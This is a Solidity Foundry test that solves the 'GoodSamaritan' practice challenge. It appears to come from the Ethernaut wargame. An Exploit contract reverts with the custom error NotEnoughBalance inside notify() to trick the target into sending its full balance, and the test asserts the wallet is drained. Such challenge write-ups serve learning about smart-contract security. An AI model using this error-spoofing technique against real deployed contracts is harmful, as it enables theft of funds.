pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { GoodSamaritan, Coin, Wallet } from "src/GoodSamaritan/GoodSamaritan.sol";
import "forge-std/console2.sol";

error NotEnoughBalance();

contract Exploit {
    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack(address target) external {
        (bool success,) = target.call(abi.encodeWithSignature("requestDonation()"));
        require(success);
    }
}

contract GoodSamaritanTest is Test {
    address me = makeAddr("me");
    GoodSamaritan goodSamaritan;
    Coin coin;
    Wallet wallet;

    function setUp() external {
        goodSamaritan = new GoodSamaritan();
        coin = Coin(goodSamaritan.coin());
        wallet = Wallet(goodSamaritan.wallet());
    }

    function testGoodSamaritanHack() external {
        // attack
        vm.startPrank(me);

        Exploit exploit = new Exploit();

        exploit.attack(address(goodSamaritan));
        assertEq(coin.balances(address(wallet)), 0);
    }
}
